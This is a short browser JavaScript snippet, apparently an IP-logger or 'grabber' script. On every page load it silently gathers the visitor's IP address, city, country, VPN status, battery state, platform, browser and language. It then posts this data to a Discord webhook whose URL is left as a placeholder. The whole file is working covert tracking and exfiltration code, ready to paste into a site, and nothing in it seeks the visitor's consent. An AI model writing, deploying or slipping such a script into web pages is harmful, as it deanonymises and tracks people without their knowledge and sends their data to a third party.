async function sendUserDataToDiscord() {
  try {
    // Fetch general user data (geo-location)
    const geoResponse = await fetch("https://json.geoiplookup.io");
    const geoData = geoResponse.ok ? await geoResponse.json() : null;

    // Fetch VPN-related data (if important for verification)
    const vpnResponse = await fetch("https://vpn.geoiplookup.io/");
    const vpnData = vpnResponse.ok ? await vpnResponse.json() : { badip: "Unknown" };

    // Attempt to fetch battery information if supported
    let batteryData = { level: "N/A", charging: "N/A" };
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryData.level = battery.level * 100;
      batteryData.charging = battery.charging ? "Yes" : "No";
    }

    // Gather device information
    const deviceData = {
      platform: navigator.platform || "Unknown",
      userAgent: navigator.userAgent || "Unknown",
      language: navigator.language || "Unknown",
      batteryLevel: batteryData.level,
      isCharging: batteryData.charging
    };

    // Format message for Discord
    const messageContent = `
      **User Data:**
      ${geoData ? `
      - IP Address: ${geoData.ip}
      - Country: ${geoData.country_name}
      - City: ${geoData.city}
      ` : "- Location Data Unavailable"}
      - Bad IP: ${vpnData.badip}
      - Device: ${deviceData.platform}
      - Browser: ${deviceData.userAgent}
      - Language: ${deviceData.language}
      - Battery Level: ${deviceData.batteryLevel}%
      - Charging: ${deviceData.isCharging}
    `;

    const discordPayload = {
      content: messageContent
    };

    // Send data to Discord webhook
    const discordResponse = await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
      method: "POST",
      headers: { 'Content-Type': "application/json" },
      body: JSON.stringify(discordPayload)
    });

    if (!discordResponse.ok) {
      console.error("Failed to send data to Discord.");
    } else {
      console.log("Data sent successfully.");
    }

  } catch (error) {
    console.error("Error sending user data:", error);
  }
}

window.addEventListener("load", sendUserDataToDiscord);
